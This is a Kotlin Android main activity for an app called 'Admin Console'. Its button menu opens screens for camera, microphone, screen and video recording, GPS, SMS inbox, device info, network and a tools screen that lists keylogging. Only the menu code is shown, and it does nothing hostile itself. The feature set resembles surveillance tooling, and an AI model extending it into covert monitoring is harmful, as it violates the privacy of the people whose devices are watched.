package com.admin.console

import android.content.Intent
import android.os.Bundle
import android.widget.Button
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val layout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(40, 60, 40, 40)
        }
        val features = listOf(
            "📷 Camera" to CameraActivity::class.java,
            "🎤 Mic Record" to MicActivity::class.java,
            "🎥 Video Record" to VideoActivity::class.java,
            "🖥 Screen Record" to ScreenActivity::class.java,
            "📍 GPS Location" to LocationActivity::class.java,
            "📩 SMS Inbox" to SmsActivity::class.java,
            "📱 Device Info" to DeviceActivity::class.java,
            "🌐 Network" to NetworkActivity::class.java,
            "🛠 Tools (battery, vibrate, torch, notify, keylog)" to ToolsActivity::class.java,
        )
        features.forEach { (label, cls) ->
            layout.addView(Button(this).apply {
                text = label
                textSize = 18f
                setOnClickListener { startActivity(Intent(this@MainActivity, cls)) }
            })
        }
        setContentView(ScrollView(this).apply { addView(layout) })
        Toast.makeText(this, "Admin Console ready", Toast.LENGTH_SHORT).show()
    }
}
